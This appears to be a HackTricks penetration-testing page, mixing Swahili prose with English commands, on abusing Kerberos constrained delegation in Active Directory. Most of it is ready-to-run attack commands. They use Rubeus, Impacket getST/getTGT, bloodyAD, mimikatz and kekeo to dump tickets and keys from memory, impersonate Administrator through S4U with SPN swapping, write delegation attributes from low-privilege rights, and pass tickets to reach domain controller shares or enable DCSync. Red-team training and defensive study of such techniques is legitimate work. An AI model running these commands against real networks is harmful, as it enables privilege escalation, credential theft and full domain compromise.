# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Kwa kutumia hili, Domain admin anaweza **kuruhusu** kompyuta **impersonate a user or computer** dhidi ya **service** yoyote ya mashine.

- **Service for User to self (_S4U2self_):** If a **service account** has a _userAccountControl_ value containing [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), then it can obtain a TGS for itself (the service) on behalf of any other user.
- **Service for User to Proxy(_S4U2proxy_):** A **service account** could obtain a TGS on behalf any user to the service set in **msDS-AllowedToDelegateTo.** To do so, it first need a TGS from that user to itself, but it can use S4U2self to obtain that TGS before requesting the other one.

**Note**: Ikiwa mtumiaji ametiwa alama ‘_Account is sensitive and cannot be delegated_’ katika AD, hautakuwa na uwezo wa kuimpersonate wao.

Hii inamaanisha kwamba ikiwa utacomproamise hash ya service unaweza kuimpersonate watumiaji na kupata access kwa niaba yao kwa service yoyote juu ya mashine zilizotajwa (inawezekana privesc).

Zaidi ya hayo, hautakuwa na access tu kwa service ambayo mtumiaji anaweza kuimpersonate, bali pia kwa service yoyote kwa sababu SPN (the service name requested) haichekiwi (katika tiketi sehemu hii haijaencrypted/signed). Kwa hivyo, ikiwa una access kwa CIFS service unaweza pia kupata access kwa HOST service kwa kutumia flag /altservice katika Rubeus kwa mfano. Udhaifu huu wa SPN swapping pia unatumiwa na Impacket getST -altservice na tooling nyingine.

Pia, access ya LDAP service kwenye DC ndio inahitajika kutekeleza DCSync.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Cross-domain constrained delegation notes (2025+)

Since **Windows Server 2012/2012 R2** the KDC supports **constrained delegation across domains/forests** via S4U2Proxy extensions. Modern builds (Windows Server 2016–2025) keep this behaviour and add two PAC SIDs to signal protocol transition:

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) wakati mtumiaji alithibitisha kawaida.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) wakati service ilidai utambulisho kupitia protocol transition.

Tegemea `SERVICE_ASSERTED_IDENTITY` ndani ya PAC wakati protocol transition inatumiwa across domains, ikithibitisha hatua ya S4U2Proxy ilifanikiwa.

### Impacket / Linux tooling (altservice & full S4U)

Recent Impacket (0.11.x+) exposes the same S4U chain and SPN swapping as Rubeus:
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'
```
Ikiwa unapendelea forging ST ya mtumiaji kwanza (kwa mfano, offline hash pekee), tumia pamoja **ticketer.py** na **getST.py** kwa S4U2Proxy. Angalia Impacket issue #1713 iliyofunguliwa kwa quirks za sasa (KRB_AP_ERR_MODIFIED wakati forged ST haitalingani na SPN key).

### Kuendesha otomatiki uundaji wa delegation kutoka kwa creds za ruhusa ndogo

Ikiwa tayari una **GenericAll/WriteDACL** juu ya kompyuta au service account, unaweza kusukuma sifa zinazohitajika kwa mbali bila RSAT ukitumia **bloodyAD** (2024+):
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Hii inakuwezesha kujenga constrained delegation path kwa privesc bila ruhusa za DA mara tu utaweza kuandika sifa hizo.

- Hatua 1: **Pata TGT ya huduma iliyoruhusiwa**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Kuna **njia nyingine za kupata TGT ticket** au **RC4** au **AES256** bila kuwa SYSTEM kwenye kompyuta, kama Printer Bug na unconstrain delegation, NTLM relaying na Active Directory Certificate Service abuse
>
> **Kwa kuwa na ile TGT ticket (au hashed) tu unaweza kufanya attack hii bila compromising kompyuta nzima.**

- Hatua2: **Pata TGS kwa ajili ya huduma ukijifanya mtumiaji**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**More information in ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) na [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## Marejeo
- [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Impacket issue #1713 – S4U2proxy forged service ticket errors](https://github.com/fortra/impacket/issues/1713)

{{#include ../../banners/hacktricks-training.md}}
